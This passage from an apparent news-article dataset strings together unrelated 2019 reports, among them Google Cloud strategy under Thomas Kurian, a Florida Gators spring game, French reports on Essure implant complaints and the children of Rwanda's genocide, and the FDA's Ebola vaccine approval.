monetise open source. We as Google do not believe that is good for customers, the developer community or for software innovation.\" \nThis was the precursor to announcing the \"first integrated open source ecosystem\" , which allows customers to use technology from open source specialists like DataStax or MongoDB using their Google Cloud credits, with a single console for management and integrated billing from Google. \nVision \nIt's somewhat unfortunate, but possibly unavoidable, that Kurian has adopted the buzzword de jour of 'digital transformation' in setting out his overall vision for Google Cloud. \n\"We have a clear vision of what we want to offer customers in a number of industries who are going through digital transformation,\" he said on stage. \"We want to give them global scale, distributed, secure infrastructure; a digital transformation platform that that helps people build innovative digital transformation solutions, and then, industry specific-capability for digital transformation in a number of industries.\" \nTaking the digital transformation platform alone, Kurian broke this down further into five elements. \"The ability to manage data at scale; build and modernise application workloads; do analysis and make better business decisions; use Google's AI and ML technology advances and collaborate with others in your organisation or outside the boundaries of your organisation in profound new ways.\" \nLet's call this the Tom Kurian Enterprise Doctrine for GCP #GoogleNext19 pic.twitter.com/H82oexCzLM \n\u2014 Tony Baer (@TonyBaer) April 9, 2019 \nOn the industry-specific solutions Kurian is focusing his attention of the healthcare, financial services, retail and media verticals to start with. \"We're building extremely deep domain-specific solutions for each industry,\" he said. Details as to what these vertical-specify solutions would actually look like isn't yet clear however. \nSpeaking to the press this week, Google Cloud VP for EMEA, Sebastien Marotte, said that Diane Greene built the foundation for Google Cloud to be an enterprise-ready cloud vendor, and now Kurian \"is going to help us accelerate our penetration of the enterprise base across the industries he mentioned today... So it is rallying and aligning the whole company, actually.\" \nGo-to-market strategy \nThe assumption is that Kurian will shift the go-to-market strategy of Google Cloud from targeting developers (bottom up) to targeting the C level technology buyers (top down). It is expected that this will translate to a significant growth of Google's go-to-market functions. \nIn one of few interviews he has done since joining the vendor Kurian told the Wall Street Journal that Google's cloud sales team is around one-tenth to one-fifteenth the size of the sales forces at AWS and Microsoft Azure. \nSpeaking on the topic with the press this week he said: \"The two things customers tell us is: we love your technology, but we don't have enough people from Google to assist us with your understanding of the technology and your understanding of our industry. \n\"So that essentially translates to growing our go-to-market function and our work with partners to deliver the right solutions for customers, which means adding people in sales and customer service and customer engineering, which is our technical teams, as well as hiring people with deep industry backgrounds.\" \nHe wouldn't be drawn on how this might translate to actual hiring figures however. \n\"When we compete with other players, we win far more of the time than they do. But we are smaller in size. Many people have asked me, they say: 'Thomas is focused on growing sales', it is not growing sales, it is growing all of our customer-facing functions,\" he added. \nSimplified pricing, licensing, co-innovation frameworks and extended partner reach are other elements of Google Cloud's new go-to-market strategy under Kurian. \nFirst impressions \nFirst impressions of Kurian show an understated, even humble leadership style, with a clear vision for the company and where its strengths lie. His quiet demeanour and gentle sense of humour almost certainly hide a steeliness however, and his aggressive desire to hire more sales and customer success staff shows a clear desire to compete and shake off Google Cloud's moniker as the third-placed player in this market. There is none of the typical tech CEO grandstanding or propensity to throw lightly-veiled barbs at competitors at this stage from Kurian though. \nNick McQuire, vice president of enterprise research at CCS Insight commented on day one of the conference that \"this is a critical moment in Google Cloud\u2019s history and pressure on it to show enterprise momentum this year has never been higher. \n\"With a new CEO and the cloud wars against AWS and Microsoft intensifying, Google remains a third place player. But it kicked off Next, which has tripled in size in two years, with some impressive announcements showing the world that open source, hybrid multi-cloud and industry verticals are now core aspects of its differentiation. Above all, a new Google Cloud is emerging under Kurian that is much more customer, sales and partner-led but it must make investments in these areas quickly if it is to put a meaningful dent in AWS and Microsoft over the next 12 months.\"",

      "title": "Led by QB Feleipe Franks, Gators put up record 95 points during spring game",
      "text": "Knowing spring games are about entertainment and not winning, UF coach Dan Mullen wants the Gators\u2019 annual Orange & Blue Debut to be fun. \nIt kind of depended on what side of the ball you were on Saturday in the Swamp. \nThe Gators\u2019 offense had its way against a defense lining up in a vanilla scheme, running just four schemes and choosing not to unleash coordinator Todd Grantham\u2019s aggressive and deceptive pass rush. \nBy the the time the fourth quarterback arrived during a 60-35 win by the Orange squad, UF had thrown for 762 yards and scored 88 points \u2014 just the way Mullen wanted it. \n\u201cOur players work hard. We push them. We demand a lot out of them,\u201d Mullen said. \u201cWe let today be more of a celebration, where they can have fun in front of their friends and family and all our fans. We want to make it a fun day.\u201d \nWhile the Gators' offensive explosion essentially was scripted, it also was a sign of the times. \nFor anyone still wondering, quarterback Feleipe Franks continued to make it clear he has a stranglehold on the starting job entering the offseason. The redshirt junior opened the game by catching a 40-yard pass from Kadarius Toney on a trick play. \nIt was the first of many big moments for Franks, who finished 13-of-18 passing for 327 yards and four touchdowns. \n\u201cYou could see Feleipe today was just on target,\u201d receiver Van Jefferson said. \u201cI think he\u2019s been that way all spring throwing balls left and right. You can see he\u2019s just really matured. \n\u201cHe took a more serious attack this spring and he\u2019s been going crazy.\u201d \nPlenty of Gators joined in on the offensive insanity. In the end, UF\u2019s attack made 14 plays of 25 yards or longer. \nReceiver Trevon Grimes, in his second season since transferring from Ohio State, caught touchdowns of 65 and 61 yards en route to a game-record 195 receiving yards. \nMeanwhile, Freddie Swain finished with 115 yards on five catches and had two touchdowns; Toney had 94 receiving yards and a score on four catches; and tight ends Kyle Pitts and Kemore Gamble combined for six catches for 121 yards. \n\u201cIt was fun, just going out there, playing with confidence,\u201d Franks said, \u201cbut at the same time, executing. I think the offense did a good job. Players were stepping up \u2014 offensive line, receivers \u2014 and just getting the job done.\u201d \nThe Gators\u2019 offense did not have to work as hard as usual. \nMullen said Franks, for one, was told Friday what four defensive alignments he would face. Star cornerback CJ Henderson also sat out, putting the team\u2019s secondary at an even bigger disadvantage. \n\u201cWhen you keep it really simple schematically and you have a veteran quarterback, he\u2019s going to out there and say, \u2018I know what they\u2019re doing; I\u2019m going to look you off and throw it here,\u2019 \u201d Mullen said. \nEven so, Franks might not have been able to execute with such ease and aplomb a year ago. \nFranks entered his first spring under Mullen having to learn a new offense while also rebuilding his confidence and blocking out the soul-crushing negativity from the fan base. \nFranks made significant strides last season, tossing 24 touchdowns and just six interceptions. But he also did not always play his best in big games, totaling two touchdown passes and three interceptions in 2018 against ranked SEC foes. \nThis spring, the 21-year-old has continued to grow and assert himself as the Gators\u2019 leader on offense and clear-cut starter under center. \n\u201cHe\u2019s just a determined young man and he\u2019s out to prove people wrong,\u201d Jefferson said. \u201cI think that\u2019s what drives him, what motivates him.\u201d \nFranks is not all business, either. \nFranks\u2019 one bad throw was a staged interception to former Gators star cornerback Lito Sheppard, who returned it for a touchdown. \nFranks joked later he could have caught the 38-year-old Sheppard, who clearly has lost more than a step since his days as a Gators\u2019 All-American and NFL Pro Bowler. \nFollowing a touchdown pass to Jefferson, Franks orchestrated a game of duck, duck, goose in the end zone. \nThe Gators\u2019 defense happily went along with the entire charade. \n\u201cThese type of games, they\u2019re really just for the fans,\u201d veteran defensive end Jabari Zuniga said. \u201cYou got fans coming up to the field, catching balls and stuff. It\u2019s really just for the fans. \n\u201cI mean, we only ran like four plays.\u201d \nWatching his defense get gouged is not something the fiery Grantham normally would take lightly. At a recent practice, he lit into first-year freshman cornerback Chris Steele following a blown coverage like he had just cost the Gators\u2019 the national title. \nMullen said Saturday was different. Grantham was prepared for what was to come. \nIn a game where nobody is a loser, fun was had by all. \n\u201cHe knows that on a day like today,\u201d Mullen said. \u201cI think he comes to grips before he gets here that that\u2019s going to happen.\u201d \nFollow our Gators coverage on Twitter at @osgators and on Facebook at https://www.facebook.com/osgators . \nEdgar can be reached at egthompson@orlandosentinel.com",

      "text": "Ezekiel Elliott showing up for launch of offseason workouts \nPosted by Mike Florio on April 15, 2019, 11:05 AM EDT \nGetty Images \nPaying running back Ezekiel Elliott seems to be a low priority for the Cowboys. Showing up for offseason workouts in Dallas seems to be a high priority for Elliott. \nElliott will attend the launch of his team\u2019s running-and-lifting sessions, according to Ian Rapoport of NFL Media. \nThe fourth-year tailback could have chosen to stay away, given that the Cowboys seem to be more focused on extending the contracts of other players. In light of the possibility that the Cowboys will never give Elliott a long-term deal, opting to chew him up and spit him out under the five years of his rookie deal, and maybe a franchise tag season or two. \nThe fact that Elliott has shown up doesn\u2019t mean he has to stay, and it also doesn\u2019t mean he\u2019ll show up for the launch of training camp later this year.",

      "text": "Ils ont recommenc\u00e9 \u00e0 aller au resto, \u00e0 faire du v\u00e9lo et m\u00eame quelques petites randonn\u00e9es. Rien \u00e0 voir avec les longues marches d\u2019avant, mais d\u00e9j\u00e0 beaucoup plus que lorsque Sabine Hahner \u00e9tait, dit-elle, \u00ab greff\u00e9e au canap\u00e9 \u00bb, pli\u00e9e de douleurs. \nAvec Gilles, son mari, mais aussi leurs deux fils de 23 et 18 ans, l\u2019infirmi\u00e8re de 51 ans vient de d\u00e9poser plainte \u00ab contre X \u00bb pour savoir qui est responsable des sympt\u00f4mes qui l\u2019ont handicap\u00e9e apr\u00e8s la pose des Essure , ces petits ressorts implant\u00e9s dans les trompes pour assurer aux femmes qui ne veulent pas ou plus d\u2019enfants une contraception d\u00e9finitive. Le dispositif Essure a \u00e9t\u00e9 retir\u00e9 du march\u00e9 en 2017. \nEst-ce le laboratoire Bayer, l\u2019Agence de s\u00e9curit\u00e9 du m\u00e9dicament, les praticiens ? Tous ? Aucun ? Comme celui de Sabine, l\u2019avocat lyonnais Stephen Duval annonce au Parisien avoir d\u00e9pos\u00e9 70 dossiers de patientes ou de leurs proches au p\u00f4le sant\u00e9 du tribunal de grande instance de Marseille (Bouches-du-Rh\u00f4ne). \u00ab Nous d\u00e9posons plainte contre X pour des faits susceptibles de rev\u00eatir des qualifications p\u00e9nales comme la mise en danger, les blessures involontaires, la tromperie aggrav\u00e9e \u00bb, d\u00e9taille l\u2019avocat. Parmi les plaignantes, une a eu six (au lieu de deux) ressorts implant\u00e9s ! Une autre a re\u00e7u le dispositif alors qu\u2019elle souffre d\u2019endom\u00e9triose, une des contre-indications \u00e0 la pose, une a eu la paroi de l\u2019ut\u00e9rus perfor\u00e9... \nDes plaintes, il y en a d\u00e9j\u00e0 eu contre le dispositif Essure, comme nous le r\u00e9v\u00e9lions le 9 d\u00e9cembre 2016 . De ce c\u00f4t\u00e9-l\u00e0, les proc\u00e9dures individuelles, ainsi que l\u2019action de groupe port\u00e9e par l\u2019association de victimes Resist se poursuivent. Mais au p\u00e9nal, c\u2019est une premi\u00e8re. \n\u00abToute la famille a \u00e9t\u00e9 impact\u00e9e\u00bb \n\u00ab Pour nous, il \u00e9tait important d\u2019aller plus loin que le civil et de signifier l\u2019enfer que j\u2019ai v\u00e9cu, que nous avons v\u00e9cu, car c\u2019est bien toute la famille qui a \u00e9t\u00e9 impact\u00e9e \u00bb, insiste, pugnace, Sabine, qui vit pr\u00e8s de Divonne-les-Bains (Ain). \nIl y a dix ans, Sabine veut se pr\u00e9munir d\u2019une grossesse \u00e0 risque, comme le fut sa deuxi\u00e8me. Elle supporte mal la pilule et se d\u00e9cide pour Essure. Normal, son gyn\u00e9co lui a vant\u00e9 ses nombreux m\u00e9rites - implantation rapide, anesth\u00e9sie locale, reprise du travail le lendemain - sans \u00e9voquer le nickel dans sa composition. Elle y est pourtant, comme l\u2019indique son dossier m\u00e9dical, allergique. \nRapidement, elle se tord, ses r\u00e8gles virent \u00e0 l\u2019h\u00e9morragie, un ganglion \u00e0 l\u2019aine appara\u00eet un mois plus tard. L\u2019h\u00f4pital pense \u00e0 une inflammation post-implantation. Elle est mise sous antibiotiques avant de voir tomber le diagnostic : c\u2019est un cancer, un lymphome agressif, dont elle veut savoir aujourd\u2019hui s\u2019il est le fruit du hasard, ou, comme elle l\u2019envisage, une cons\u00e9quence des ressorts en m\u00e9tal. \nApr\u00e8s une lutte acharn\u00e9e contre le crabe pendant lequel elle \u00ab oublie \u00bb ses implants, une autre commence. Alors qu\u2019elle est r\u00e9tablie, des douleurs articulaires apparaissent, des crampes la font tomber, elle n\u2019arrive plus, assure-t-elle, \u00e0 marcher plus de 300 m, renonce \u00e0 certaines consultations de patients, elle l\u2019infirmi\u00e8re. \n\u00abLa col\u00e8re a grond\u00e9\u00bb \n\u00c0 la maison, tout s\u2019\u00e9tiole. \u00ab La vie change du tout au tout. Nous \u00e9tions impuissants face \u00e0 sa souffrance, confie Gilles. La femme, la m\u00e8re pleine d\u2019entrain s\u2019effa\u00e7ait. Nous avons renonc\u00e9 aux vacances, aux d\u00eeners avec les amis. C\u2019est difficile \u00e0 comprendre car ce n\u2019est pas comme une jambe cass\u00e9e : l\u00e0, c\u2019est un mal invisible. \u00bb \nUn mal dont elle se d\u00e9barrassera le 27 mars 2017, apr\u00e8s avoir vu dans la presse les dizaines de t\u00e9moignages de femmes qui, comme elle, t\u00e9moignaient d\u2019effets ind\u00e9sirables intenables. Pour retirer les Essure, dont la pose est irr\u00e9versible, il a fallu lui enlever l\u2019ut\u00e9rus, son col, les trompes. \u00ab Je vis toujours cela comme une mutilation \u00bb, souffle Sabine. Apr\u00e8s l\u2019op\u00e9ration, la fatigue s\u2019att\u00e9nue, les douleurs s\u2019estompent, elle peut m\u00eame reprendre le travail. \n\u00ab J\u2019aurais pu en rester l\u00e0, mais le choc pass\u00e9, la col\u00e8re a grond\u00e9. Tant d\u2019ann\u00e9es g\u00e2ch\u00e9es. Cette plainte, j\u2019en ai besoin pour me reconstruire \u00bb, explique celle qui s\u2019investit \u00ab \u00e0 fond \u00bb dans l\u2019association Alerte Contraceptions. Et aussi parce que tout n\u2019est pas r\u00e9par\u00e9. \nAvec une grande pudeur, elle parle de ce corps qui a \u00ab br\u00fbl\u00e9 de l\u2019int\u00e9rieur \u00bb, de la partie intime de son mariage qui n\u2019existe plus : \u00ab Morte. Ou en sommeil, j\u2019esp\u00e8re \u00bb, reprend-elle dans un sursaut. Des couples, Essure en a fait voler. Le leur a r\u00e9sist\u00e9. \u00ab Parce que je l\u2019aime, dit, presque intimid\u00e9, Gilles devant les immenses yeux de Sabine. Je veux vivre avec elle la v\u00e9rit\u00e9. \u00bb C\u2019est ensemble qu\u2019ils iront au bout.",

      "text": "Jonathan Torgovnik/Verbatim \nAu Rwanda, les enfants du g\u00e9nocide \nPar Pierre Lepidi \nT\u00e9moignages R\u00e9serv\u00e9 \u00e0 nos abonn\u00e9s \nPubli\u00e9 aujourd\u2019hui \u00e0 07h16, mis \u00e0 jour \u00e0 07h16 \nLors du massacre des Tutsi en 1994, les femmes furent la proie de viols syst\u00e9matiques. Le photographe Jonathan Torgovnik a recueilli la parole des survivantes et de leurs enfants. \nLes chiffres ne r\u00e9v\u00e8lent pas tout. D\u2019apr\u00e8s l\u2019ONU, pr\u00e8s de 800 000 Tutsi et Hutu mod\u00e9r\u00e9s ont trouv\u00e9 la mort lors du g\u00e9nocide au Rwanda, au printemps 1994. Selon un recensement effectu\u00e9 par le minist\u00e8re rwandais de l\u2019administration du territoire en 2000, ce sont pr\u00e9cis\u00e9ment 1 074 017 personnes qui ont \u00e9t\u00e9 massacr\u00e9es, \u00e0 une cadence infernale de 447 morts par heure pendant cent jours. \nMais, sur les vertes collines de ce pays d\u2019Afrique centrale, le bilan est en r\u00e9alit\u00e9 bien plus lourd. Alors que le Rwanda va comm\u00e9morer, dimanche 7 avril, les 25 ans du g\u00e9nocide des Tutsi, des cadavres sont encore d\u00e9terr\u00e9s tous les mois sur des chantiers ou apr\u00e8s des orages. \nDans l\u2019horreur extr\u00eame, on ne peut pas tout quantifier. Quel que soit le conflit, la douleur et le traumatisme des survivants n\u2019entrent pas dans les statistiques. On communique sur le nombre de disparus, parfois de bless\u00e9s, mais il y a les autres, ceux qui ont vu, qui ont surv\u00e9cu. Au Rwanda, les blessures psychologiques restent vives. \nUn quart de si\u00e8cle ne suffit pas \u00e0 une m\u00e8re hutu pour \u00ab oublier \u00bb qu\u2019on l\u2019a forc\u00e9e \u00e0 jeter ses enfants tutsi dans une rivi\u00e8re ou \u00e0 les tuer \u00e0 coups de marteau. Les associations de rescap\u00e9s ont recens\u00e9 vingt-neuf fa\u00e7ons de tuer pendant le massacre. Mais tout le monde n\u2019est pas mort. \nDes vies surgies du chaos \nLe viol a \u00e9t\u00e9 utilis\u00e9 comme arme de destruction massive par les Interahamwe, les milices hutu. Bien que la plupart des femmes aient \u00e9t\u00e9 abattues apr\u00e8s avoir servi d\u2019esclaves sexuelles, un rapport des Nations unies a conclu qu\u2019au moins 250 000 d\u2019entre elles furent viol\u00e9es au printemps 1994. Elles furent parfois p\u00e9n\u00e9tr\u00e9es avec des tessons de bouteilles de bi\u00e8re, des branches de bananier, des ubuhiri, sorte de massues clout\u00e9es\u2026 \nLeurs organes sexuels furent mutil\u00e9s \u00e0 la machette ou \u00e0 l\u2019acide. Dans sa folie meurtri\u00e8re, le r\u00e9gime g\u00e9nocidaire a aussi imagin\u00e9 une mani\u00e8re plus lente de tuer des femmes. Il a lib\u00e9r\u00e9 des h\u00f4pitaux des bataillons d\u2019hommes malades du VIH, et leur a donn\u00e9 pour mission de violer jusqu\u2019\u00e0 \u00e9puisement. On estime que 70 % des femmes abus\u00e9es ont contract\u00e9 le virus. \nMais au milieu du chaos jaillit parfois la vie. Si des m\u00e8res ont abandonn\u00e9 l\u2019enfant qu\u2019elles portaient \u00e0 la suite des violences qu\u2019elles ont subies, d\u2019autres l\u2019ont gard\u00e9. Et, parfois, aim\u00e9. C\u2019est ce que montrent les clich\u00e9s de Jonathan Torgovnik, photographe isra\u00e9lien install\u00e9 en Afrique du Sud et fin connaisseur du continent africain. \nLire aussi : Enqu\u00eate sur le financement du g\u00e9nocide au Rwanda : apr\u00e8s les tueries, l\u2019heure des comptes (\u00e9dition abonn\u00e9s) \nEn 2006, il se rend au Rwanda dans le cadre d\u2019un reportage sur le sida en Afrique. Il rencontre des femmes porteuses du virus, dont certaines sont devenues m\u00e8res apr\u00e8s avoir \u00e9t\u00e9 abus\u00e9es. Pr\u00e8s de 20 000 enfants sont n\u00e9s dans l\u2019enfer des viols collectifs et r\u00e9p\u00e9t\u00e9s commis pendant le g\u00e9nocide.

Gamble Responsibly \nOne of a trio of sprinters Irish trainer Aidan O\u2019Brien brought to Australia last spring is set to have his first start for Warrnambool-based Matthew Williams. \nIntelligence Cross had three starts in Melbourne during the spring, twice at Group One level, finishing close to the tail of the field on each occasion and is set to run in the Listed Bel Esprit Stakes at Caulfield on Saturday. \nThe five-year-old was days away from returning to Ireland when he was bought before having one start for now disqualified trainer Darren Weir, finishing less than 3-1/2 lengths from Native Soldier in the Christmas Stakes at Caulfield on December 26. \n\u201cI thought he went OK knowing full well that he wouldn\u2019t have been fully wound up, but he ran through the line quite well,\u201d Williams said. \n\u201cAnd apparently he had quite a few feet issues when he came out as an import at the quarantine centre. \n\u201cHis feet are in really good shape now and the farriers have done a really good job with him. \n\u201cHe\u2019s trotting out really sound and well.\u201d \nWilliams is setting Intelligence Cross for Warrnambool\u2019s major sprint race, the Wangoom Handicap, during next month\u2019s three-day carnival. \nHis recent trials have been solid with Williams saying the five-year-old is ready to \u201crock \u2018n\u2019 roll\u201d. \n\u201cThe plan is to give him this run and have him ready second-up for the Wangoom,\u201d Williams said. \n\u201cHe won a trial at Camperdown on Monday but I think 1200 metres will suit him better than the 1100 on Saturday. \n\u201cIf he\u2019s running within three lengths of them on Saturday I\u2019d come away pretty happy knowing there\u2019s some improvement in him for the Wangoom. \n\u201cAnd a bit of softer ground would also probably help him.\u201d \nIntelligence Cross will wear a barrier blanket on Saturday after jumping successfully with one on Monday. \nWilliams has taken the sprinter to trial three times in the lead-up to Saturday\u2019s return and was surprised by his antics a fortnight ago. \n\u201cHe\u2019s a lovely little horse and I was surprised when he kicked out in the gates and carried on, so we ended up not trialling him,\u201d Williams said. \n\u201cWe put a barrier blanket on him on Monday and he was a good as gold and we\u2019ll put him in one on Saturday.\u201d \nClaim up to $200 in Racing Bonus Bets! * \n*Conditions Apply.

      "title": "Going Beyond Employee Happiness: Why Activation Matters Most",
      "text": "Many business leaders today recognize that their employees are key differentiators in today\u2019s uber-competitive business environment. That\u2019s particularly the case right now as job openings in the U.S. reach record highs. Keeping employees happy has become an important imperative within the executive ranks. \nHowever, while happiness is a noble and vital goal for a workforce, company leaders must ensure that the steps they\u2019re taking to increase employee connectedness to a company go beyond simple happiness. They must align employee and company interests for the future. What matters above all else today is not simply employee happiness, but employee activation. Fortunately, the two can and should go hand-in-hand. \nThe Tricky Notion of Engagement \nIn Gallup\u2019s \u201c State of the American Workplace \u201d report, the researchers wisely caution against judging the state of a company\u2019s workforce based on the level of friendly chatter happening around the water cooler or \u2014 increasingly \u2014 on a company\u2019s digital communication platforms. The authors note: \u201cEmployees may feel connected to their team members, but if, among other challenges, they don\u2019t know what\u2019s expected of them (a basic need), don\u2019t have the appropriate materials and equipment (a basic need), or are not able to do what they do best (an individual need), their affiliation with their team members is unlikely to have a positive impact on their performance. Instead, time spent with their peers may more closely resemble a gripe session than productive teamwork.\u201d \nIndeed, positive employee interactions are crucial for driving business results. But companies must be discerning when monitoring and measuring these interactions. Are the employees truly engaged with their work and the organization? Or are they merely engaged with their co-workers? It\u2019s easy to confuse the two. \nThat\u2019s where employee activation comes in. Activation goes beyond basic measures of employee satisfaction and interaction to identify workforce attributes that contribute meaningfully to business results. An activated employee is one who feels and acts with ownership over the company\u2019s success. They are continuously trying to improve the company \u2013 with product and service improvements, customer experience improvements, and by identifying opportunities to be more efficient on the job. \nThey are a gold mine of potential. \nWhy Activation Matters \nUnfortunately, most U.S. employees today are not activated for the good of their companies. According to Gallup, only 21 percent of employees say their performance is managed in a way that motivates them to do outstanding work. The overall attitude toward jobs these days is, unfortunately, one of overwhelming indifference. And that matters greatly to business success. According to Gallup, companies whose employees are involved and committed to their work see the following benefits: \n10 percent higher customer metrics \n17 percent higher productivity \n20 percent higher sales \n21 percent higher profitability \nIn short, the benefits of an activated workforce are quantifiable and significant. So, how can businesses fuel activation among their teams? \nHow Leaders Build Activated Employees \nImproving employee activation within a company\u2019s workforce requires a commitment to not only meeting employee needs, but also giving them the tools to interact and contribute meaningfully to solving a company\u2019s challenges. Leaders of companies with the strongest employee activation focus on the following: \nDesigning and delivering an employee experience that is compelling and consistent with the employer\u2019s brand. It\u2019s important to walk the talk. If a company prides itself on its customer commitment, it needs to extend to its own team members. This means not overwhelming them with unnecessary, unfocused communication and ensuring that employees have a way to provide feedback to management. \nTaking employee engagement from a survey to an ongoing activity that improves performance. Survey results are useful. But if a company doesn\u2019t act on what its employees are telling it, employee activation can actually take a step backward. \nApproaching performance management in ways that motivate employees. Companies need to give team members a reason to want to succeed, as well as a clear path to success. \nOffering benefits and perks that influence attraction and retention. Even the most activated employees need to know that their companies care enough to continue investing in them. \nEnabling people to work successfully from locations other than the office. Flexibility is becoming the new expectation. A company\u2019s systems must enable employees to remain meaningfully engaged in work, even when remote. \nConstructing office environments that honor privacy while encouraging collaboration. Employees\u2019 desire for flexibility extends to their physical spaces as well. \nImproving clarity and communication for employees who work on multiple teams. The digital age has given rise to tools and means of increasing visibility into team operations. Make sure the platforms you\u2019re using will do more than enable digital water cooler talk. Look for ones where real work can happen. \nEmployee activation doesn\u2019t happen in a vacuum. Companies need to make a concerted effort to enable employees to meaningfully contribute to the success of their organizations. The question isn\u2019t whether businesses can afford to implement such programs and tools. Quite simply, businesses no longer can afford to not make that effort. \nThis article first appeared in HR Technologist. Learn more about the growing role of Employee Experience here.",

St. Landry Parish is 56% white and 41% black, and the Times interviewed a reverend of one of the burned churches who said that \"relations were generally good between black and white residents.\" Church burnings were a common, and often unreported, crime in the south during the Civil Rights movement in the 1960s and earlier.",

      "text": "If you\u2019re on Twitter, here\u2019s an experiment: type \u201cEnemy of the People\u201d in a tweet through Twitter\u2019s web client, then see if it automatically suggests an account for you to tag. For a lot of (if not all) users, this currently brings up The New York Times \u2019 Twitter handle. At first glance, it looks like a pretty weird attack on the Times \u2014 and it\u2019s something a number of journalists and other users have noticed this afternoon. \nIt\u2019s not illogical to think that Twitter\u2019s algorithm has drawn a disquieting link between one of President Donald Trump\u2019s favorite phrases and one of the targets that he most frequently flings it at. But the real issue is apparently less damning and more confusing: Twitter seems to suggest the Times for just about any phrase that ends with the capitalized word \u201cPeople.\u201d \nIn Twitter\u2019s world, The New York Times is the Enemy of the People. It\u2019s also the Friend of the People. And if you mention the bands Foster the People or the Village People, Twitter is pretty sure you really want to tweet about the Gray Lady. \nWe\u2019re not sure what precise link Twitter is drawing between @NYTimes and \u201cPeople.\u201d Its autosuggest system is generally a bit opaque, and this could be either an outright bug or an oblique association based on something in the Times profile. (To make things even more confusing, Twitter also apparently links the Times to the word \u201cSanders.\u201d) We\u2019ve reached out to Twitter for more details \u2014 but for now, it\u2019s just one of the inscrutable mysteries of the algorithm. \nUpdate 7:15PM ET: Twitter confirmed in a statement to The Verge that the \u201cPeople\u201d connection is some sort of glitch. \u201cThis is a bug in our search typeahead system limited to desktop that we are working to fix,\u201d a spokesperson said. \u201cThe issue is that for some search queries, the word \u2018People\u2019 is linked to \u2018@NYTimes.\u2019\u201d So while we still don\u2019t really know why the search system is working this way, we do know that it\u2019s supposed to be working differently.",

      "text": "Dive Brief: \nThe Food and Drug Administration has approved Merck & Co.'s vaccine to protect people from the Ebola virus, making the first approved vaccine for the contagious disease that drew worldwide attention from a 2014 epidemic that killed more than 11,000 people. \nAn ongoing Ebola outbreak has drawn attention once again, causing more than 2,000 deaths in the Democratic Republic of the Congo since August 2018. Merck's vaccine, now branded as Ervebo, and other experimental treatments from drugmakers including Johnson & Johnson and Regeneron have been given to thousands of people in the DRC since. \nWhile Merck's vaccine remains unapproved in Africa, the drugmaker said Friday it has submitted the medicine to African regulators in collaboration with the African Vaccine Regulatory Forum. The European Commission approved Ervebo last month, and countries are expected to stockpile the vaccine to protect against potential bioterrorism attacks. \nDive Insight: \nMerck CEO Ken Frazier has publicly highlighted the Ebola vaccine development as part of the drugmaker's public health duties. \n\"For efforts such as this there is no commercial opportunity, but we pursue them because these are the challenges that Merck was created to tackle,\" Frazier said in February in prepared remarks before a Senate committee. \nThe New Jersey-based pharma giant isn't alone in the endeavor, as there are eight vaccines in various stages of development, according to Gavi, the Vaccine Alliance. \nMerck has shipped more than 275,000 doses to the Congo since the outbreak started, and nearly 1,000 people have also received J&J's vaccine as part of a trial. \nData from the local government has shown steady declines in the number of weekly confirmed cases after peaking in the first half of 2019. From Dec. 11-17, health officials in eastern Congo reported 11 new, confirmed cases of Ebola. \nThe board of Gavi, a nonprofit that receives funding from a wide range of governments, philanthropies and companies, approved a plan earlier this month to stockpile 500,000 doses of Ebola vaccine from now to 2025. It plans to then donate that medicine to low- and middle-income countries. \nWhile the outbreak has remained primarily contained to the Congo, U.S. health officials emphasized the value to public health preparedness of having an approved vaccine. \n\"Ebola virus disease is a rare but severe and often deadly disease that knows no borders,\" Peter Marks, director of the FDA's Center for Biologics Evaluation and Research, said in a Dec. 19 statement . \"Vaccination is essential to help prevent outbreaks and to stop the Ebola virus from spreading when outbreaks do occur.\" \nThe FDA issued a priority review voucher to Merck along with the approval.",

      "text": "Snap \nHello! \nWelcome to the Advertising and Media Insider newsletter, where we catch you up on all the big stories our team's been working on this past week. If you got this newsletter forwarded, sign up for your own here . If you have tips or feedback, email me at lmoses@businessinsider.com. \nSnap has been having popularity problems with users, advertisers, and creators. Its stab at wearables, with Spectacles, was a flop. Last week Tanya Dua attended Snap's first Creators Summit, a big step by the app to try to win over creators from the likes of YouTube and Instagram. Snap has also been on a charm offense with advertisers, enabling them to extend their Snapchat ads outside the app. \nBut as Tanya reported , Snap also may be onto something with its early foray into augmented reality. Some experts believe AR is going to be the platform of the future, and Snap could benefit. Its announcement of a slew of AR-related updates and features at the Summit was a decided step in that direction. Don't count out Facebook, Google, Apple, Microsoft, and Magic Leap, though, which have all made AR investments of their own. \nThe deadline for nominations for the most innovative chief marketing officers is coming up April 29, and we want to hear from you. Submit your nominations here . \nElsewhere, Abby Jackson has been reporting on the advent of 5G and potential winners and losers. Here are the takeaways: \nCable companies like Comcast and Charter could be positioned to take the lead in managing in-home broadband internet of things, according to Cowen analysts. \nWith the proliferation of smart devices like TVs, voice assistants, and thermostats, cable companies have big chance to handle people's device management because they already have a direct relationship with them. \nBut for other companies further downstream, investment bankers tell us companies are confused about what 5G means to them , which complicates their ability to plan for it. \nTo the extent wireless carriers rely on other businesses to bring 5G's benefits to fruition, 5G innovation may be delayed until these companies' questions are resolved. \nAbby and I also got the scoop on a private meeting that Verizon Media (formerly Oath) had with big advertisers to prove it's still relevant. The key points: \nVerizon Media has fallen short on advertisers' wish for an alternative to rival Google and Facebook for digital advertising. \nThe agency execs are skittish themselves about using consumer data to target ads in today's privacy era. \nOne theory of the agencies is that Verizon is so concerned about misuse of its customer data in this privacy-sensitive era that it won't entrust it to its own media arm. \nThe company also shared content plans including a Yahoo Finance Premium subscription service that it's testing at monthly prices of $35 to $55; more fantasy sports; and exploration of online sports betting, to mixed reviews from advertisers. \nHere are other good stories we\u2019ve been reporting. (To read most of the articles here, subscribe to BI Prime and use promo code AD2PRIME2018 for a free month.) \nAccenture Interactive\u2019s acquisition of Droga5 will fill an obvious hole in its lineup as the company tries to change the way products are marketed \nThe deal is about more than just having a creative agency in-house, Accenture Interactive CEO Brian Whipple said. The firm has been focusing on helping clients rethink the way their customers discover and interact with their products and services, and Whipple thinks Droga5 can help Accenture Interactive come up with imaginative new experiences for its clients. \nDavid Droga reveals why he's giving up his cherished independence and selling Droga5 to Accenture Interactive \nDroga said he thought selling was the best way to increase his firm's influence, widen the group of clients it works with, and broaden the scope of its work. \nAd-tech execs are betting big on OTT but worry that ad fraud and measurement challenges will hold back advertisers \nAd-tech companies are chasing money that's moving from TV to streaming TV, but worry that ad fraud and measurement challenges are making their way into OTT, according to chatter at an industry event. \nSend tips or thoughts to me at lmoses@businessinsider.com. \nHere are other good stories from tech, media, and entertainment: ",

